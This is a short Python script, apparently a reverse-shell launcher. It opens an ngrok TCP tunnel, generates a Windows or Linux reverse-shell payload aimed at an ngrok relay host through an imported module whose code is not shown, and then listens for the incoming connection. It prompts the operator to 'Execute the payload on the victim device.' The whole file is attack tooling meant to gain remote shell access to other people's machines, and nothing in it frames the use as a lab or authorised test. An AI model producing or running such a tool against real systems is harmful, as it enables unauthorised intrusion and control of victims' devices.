import subprocess
from termcolor import colored
import threading
import socket
import reverse_shell_gen
import time


def clear_screen():
    subprocess.run(["cls"], shell=True)


def sleep():
    time.sleep(2)


def start_ngrok_service():
    NEW_CONSOLE = subprocess.CREATE_NEW_CONSOLE
    subprocess.Popen(
                    ["ngrok", "tcp", "4444"], 
                     creationflags=NEW_CONSOLE 
    )


def start_listener():
    print("\n[!] Listener started.")
    print("[!] Execute the payload on the victim device.")
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("localhost", 4444))
    listener.listen()
    conn, ip = listener.accept()
    print("\nConnection recieved from {}!".format(ip[0]))


def generate_payload():
    try:
        print("[!] In the Ngrok window look for IP:PORT next to forwarding row.")
        print("\n[!] Copy the PORT and enter it in the console.")
        port = int(input("\n\nPORT: "))
        os = input("\nWindows or Linux payload? w/l ")
        if os == "w":
            reverse_shell_gen.windows_payload(ip_addr="0.tcp.au.ngrok.io",
                                              port=port)
        elif os == "l":
            reverse_shell_gen.linux_payload(ip_addr="0.tcp.au.ngrok.io", 
                                            port=port)
        
    except ValueError:
        print("\nPlease input the port you see after EX: 0.tcp.au.ngrok.io")
        print("\nPort numbers range from 1-65500.")
        sleep()
        clear_screen()
        generate_payload()


def main():
    clear_screen()
    sng_service = threading.Thread(target=start_ngrok_service)
    sng_service.start()
    generate_payload()
    start_listener()


if __name__ == "__main__":
    main()
